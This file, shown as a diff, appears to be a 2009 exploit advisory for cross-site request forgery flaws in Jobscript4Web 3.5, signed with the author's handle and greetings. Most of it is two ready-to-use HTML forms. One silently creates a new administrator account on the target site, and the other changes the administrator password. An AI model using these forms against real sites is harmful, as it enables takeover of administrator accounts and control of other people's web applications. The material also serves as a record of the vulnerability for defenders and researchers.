@@ -1,0 +1,64 @@
+# Title: Jobscript4Web 3.5 Multiple CSRF Vulnerability
+# Date: 17/12/2009
+# Author: bi0
+# Software Link: http://www.jobscript4web.com/
+# Version: 3.5
+# CVE : ()
+
+
+                ______     __     ______
+               /\  == \   /\ \   /\  __ \
+               \ \  __<   \ \ \  \ \ \/\ \
+                \ \_____\  \ \_\  \ \_____\
+                 \/_____/   \/_/   \/_____/
+
+                 01000010 01101001 01001111
+
+[#]----------------------------------------------------------------[#]
+#
+# [+] Jobscript4Web 3.5 Multiple CSRF Vulnerability
+#
+#  // Author Info
+# [x] Author: bi0
+# [x] Contact: bukibv@hotmail.com
+# [x] Thanks: sp1r1t,packetdeath,Zer0flag,redking and all my friends
+# [x] Irc : irc.freenode.net / #security-shell
+# [*] Note : R.I.P Rock4eveR,We`ll never forget you !
+#
+[#]-------------------------------------------------------------------------------------------[#]
+#
+# [x] Exploit :
+#
+#    // CSRF to Create an Admin Account
+#
+#================================================================#
+<html>
+<body>
+<!-- Create new Admin -->
+<form name="frmsignup" id="frmsignup"  action="http://[server]/admin/admin_staffs" method="post">
+<input name="name" type="text" id="name" value="Name">
+<input name="username" type="text" id="username" value="Username">
+<input name="pass" type="text" id="pass"  value="test123">
+<input name="email" type="text" id="email" value="email@somtging.com">
+<input type="hidden" id="status" value="Active" name="status" >
+<input name="Submit" type="submit" value="Submit">
+</body>
+</html>
+
+#================================================================#
+#   // CSRF to Change Admin Password
+#
+#================================================================#
+<html>
+<body>
+<!-- Change Admin Password -->
+<form name="signupForm" id="signupForm"  action="http://[server]/admin/adminpass_submit.php" method="post">
+<input name="txtp" type="password" id="txtp" value="password1">
+<input name="txtcp" type="password" id="txtcp" value="password1">
+<input type="submit" name="Submit" value="Submit">
+</body>
+</html>
+#================================================================#
+[#]------------------------------------------------------------------------------------------[#]
+
+#EOF
